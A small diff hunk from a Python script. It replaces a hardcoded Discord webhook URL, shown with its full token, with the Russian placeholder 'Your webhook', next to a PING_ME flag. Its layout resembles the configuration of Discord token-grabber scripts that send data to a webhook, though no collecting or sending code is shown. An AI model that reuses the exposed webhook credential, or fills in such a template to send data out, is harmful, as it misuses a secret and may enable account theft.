@@ -6,7 +6,7 @@ import string
 import time
 from urllib.request import Request, urlopen
 
-WH = 'https://discord.com/api/webhooks/953206466058285126/Za7uetx8kaNOpLoxEll8HITm5j6hLbiVS_CkbTIGej8OH2r_kU8ttct7q0lT88C9A5nW'
+WH = 'Твой вебхук'
 
 
 PING_ME = False
